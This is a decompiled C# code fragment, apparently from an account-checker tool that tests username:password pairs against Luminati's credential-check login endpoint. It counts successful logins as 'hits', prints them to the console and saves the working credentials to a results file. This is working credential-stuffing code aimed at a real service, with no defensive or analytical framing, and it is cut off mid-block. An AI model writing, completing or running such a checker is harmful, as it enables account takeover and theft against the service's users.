        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str2 = httpRequest.Post("https://luminati.io/users/auth/basic/check_credentials", str1, "application/x-www-form-urlencoded").ToString();
              if (str2.Contains("ok"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - LUMINATI] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Luminati_hits", s[0] + ":" + s[1]);
                return false;
              }
              if (str2.Contains("unauthorized") || str2.Contains("not_registered") || str2.Contains("google_login_only"))
                break;
            }
          }
          catch (Exception ex)
